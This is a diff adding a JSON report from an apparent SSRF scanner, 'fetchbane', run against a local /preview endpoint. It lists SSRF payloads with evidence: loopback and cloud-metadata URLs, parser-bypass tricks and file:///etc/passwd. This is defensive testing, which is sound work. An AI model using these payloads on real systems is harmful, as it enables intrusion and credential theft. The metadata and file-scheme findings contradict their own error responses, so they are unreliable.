@@ -1,0 +1,152 @@
+{
+  "report_version": "1.0",
+  "plugin": "fetchbane",
+  "orchestrator": null,
+  "generated_at": "2026-07-25T16:03:07.911070+00:00",
+  "spec_id": "aSccef",
+  "base_url": "http://localhost:18106",
+  "summary": {
+    "live_targets": 1,
+    "candidates": 1,
+    "findings_total": 8,
+    "findings_high": 7,
+    "findings_medium": 1,
+    "findings_low": 0,
+    "findings_info": 0,
+    "actionable": 8,
+    "passed": false
+  },
+  "targets": [
+    {
+      "endpoint": "/preview",
+      "source": "cli"
+    }
+  ],
+  "candidates": [
+    {
+      "endpoint": "/preview"
+    }
+  ],
+  "findings": [
+    {
+      "target": "http://localhost:18106/preview (GET)",
+      "check": "ssrf_canary_reflection",
+      "severity": "high",
+      "detail": "GET /preview fetched attacker-controlled URL and reflected canary marker in response (payload='http://127.0.0.1:9999/secret'). Confirmed SSRF.",
+      "evidence": {
+        "method": "GET",
+        "endpoint": "/preview",
+        "param": "url",
+        "payload": "http://127.0.0.1:9999/secret",
+        "status": 200,
+        "body_snippet": "{\"fetched\":\"FETCHBANE_CANARY_SECRET\",\"ok\":true,\"status\":200,\"url\":\"http://127.0.0.1:9999/secret\"}\n",
+        "vector": "loopback_canary"
+      }
+    },
+    {
+      "target": "http://localhost:18106/preview (GET)",
+      "check": "ssrf_canary_reflection",
+      "severity": "high",
+      "detail": "GET /preview fetched attacker-controlled URL and reflected canary marker in response (payload='http://localhost:9999/secret'). Confirmed SSRF.",
+      "evidence": {
+        "method": "GET",
+        "endpoint": "/preview",
+        "param": "url",
+        "payload": "http://localhost:9999/secret",
+        "status": 200,
+        "body_snippet": "{\"fetched\":\"FETCHBANE_CANARY_SECRET\",\"ok\":true,\"status\":200,\"url\":\"http://localhost:9999/secret\"}\n",
+        "vector": "loopback_localhost"
+      }
+    },
+    {
+      "target": "http://localhost:18106/preview (GET)",
+      "check": "ssrf_cloud_metadata",
+      "severity": "high",
+      "detail": "GET /preview appears to have reached cloud metadata via 'http://169.254.169.254/latest/meta-data/' (HTTP 200).",
+      "evidence": {
+        "method": "GET",
+        "endpoint": "/preview",
+        "param": "url",
+        "payload": "http://169.254.169.254/latest/meta-data/",
+        "status": 200,
+        "body_snippet": "{\"error\":\"HTTPConnectionPool(host='169.254.169.254', port=80): Max retries exceeded with url: /latest/meta-data/ (Caused by NewConnectionError(\\\"HTTPConnection(host='169.254.169.254', port=80): Failed to establish a new connection: [Errno 111] Connection refused\\\"))\",\"ok\":false,\"url\":\"http://169.254.169.254/latest/meta-data/\"}\n",
+        "vector": "aws_metadata"
+      }
+    },
+    {
+      "target": "http://localhost:18106/preview (GET)",
+      "check": "ssrf_cloud_metadata",
+      "severity": "high",
+      "detail": "GET /preview appears to have reached cloud metadata via 'http://metadata.google.internal/computeMetadata/v1/' (HTTP 200).",
+      "evidence": {
+        "method": "GET",
+        "endpoint": "/preview",
+        "param": "url",
+        "payload": "http://metadata.google.internal/computeMetadata/v1/",
+        "status": 200,
+        "body_snippet": "{\"error\":\"HTTPConnectionPool(host='metadata.google.internal', port=80): Max retries exceeded with url: /computeMetadata/v1/ (Caused by NameResolutionError(\\\"HTTPConnection(host='metadata.google.internal', port=80): Failed to resolve 'metadata.google.internal' ([Errno -2] Name or service not known)\\\"))\",\"ok\":false,\"url\":\"http://metadata.google.internal/computeMetadata/v1/\"}\n",
+        "vector": "gcp_metadata"
+      }
+    },
+    {
+      "target": "http://localhost:18106/preview (GET)",
+      "check": "ssrf_canary_reflection",
+      "severity": "high",
+      "detail": "GET /preview fetched attacker-controlled URL and reflected canary marker in response (payload='http://example.com@127.0.0.1:9999/secret'). Confirmed SSRF.",
+      "evidence": {
+        "method": "GET",
+        "endpoint": "/preview",
+        "param": "url",
+        "payload": "http://example.com@127.0.0.1:9999/secret",
+        "status": 200,
+        "body_snippet": "{\"fetched\":\"FETCHBANE_CANARY_SECRET\",\"ok\":true,\"status\":200,\"url\":\"http://example.com@127.0.0.1:9999/secret\"}\n",
+        "vector": "bypass_at_userinfo"
+      }
+    },
+    {
+      "target": "http://localhost:18106/preview (GET)",
+      "check": "ssrf_canary_reflection",
+      "severity": "high",
+      "detail": "GET /preview fetched attacker-controlled URL and reflected canary marker in response (payload='http://127.0.0.1:9999/secret#@example.com'). Confirmed SSRF.",
+      "evidence": {
+        "method": "GET",
+        "endpoint": "/preview",
+        "param": "url",
+        "payload": "http://127.0.0.1:9999/secret#@example.com",
+        "status": 200,
+        "body_snippet": "{\"fetched\":\"FETCHBANE_CANARY_SECRET\",\"ok\":true,\"status\":200,\"url\":\"http://127.0.0.1:9999/secret#@example.com\"}\n",
+        "vector": "bypass_hash_fragment"
+      }
+    },
+    {
+      "target": "http://localhost:18106/preview (GET)",
+      "check": "ssrf_canary_reflection",
+      "severity": "high",
+      "detail": "GET /preview fetched attacker-controlled URL and reflected canary marker in response (payload='http://2130706433:9999/secret'). Confirmed SSRF.",
+      "evidence": {
+        "method": "GET",
+        "endpoint": "/preview",
+        "param": "url",
+        "payload": "http://2130706433:9999/secret",
+        "status": 200,
+        "body_snippet": "{\"fetched\":\"FETCHBANE_CANARY_SECRET\",\"ok\":true,\"status\":200,\"url\":\"http://2130706433:9999/secret\"}\n",
+        "vector": "bypass_decimal_ip"
+      }
+    },
+    {
+      "target": "http://localhost:18106/preview (GET)",
+      "check": "ssrf_file_scheme",
+      "severity": "medium",
+      "detail": "GET /preview appears to have read local file via 'file:///etc/passwd'.",
+      "evidence": {
+        "method": "GET",
+        "endpoint": "/preview",
+        "param": "url",
+        "payload": "file:///etc/passwd",
+        "status": 200,
+        "body_snippet": "{\"error\":\"No connection adapters were found for 'file:///etc/passwd'\",\"ok\":false,\"url\":\"file:///etc/passwd\"}\n",
+        "vector": "file_scheme"
+      }
+    }
+  ]
+}
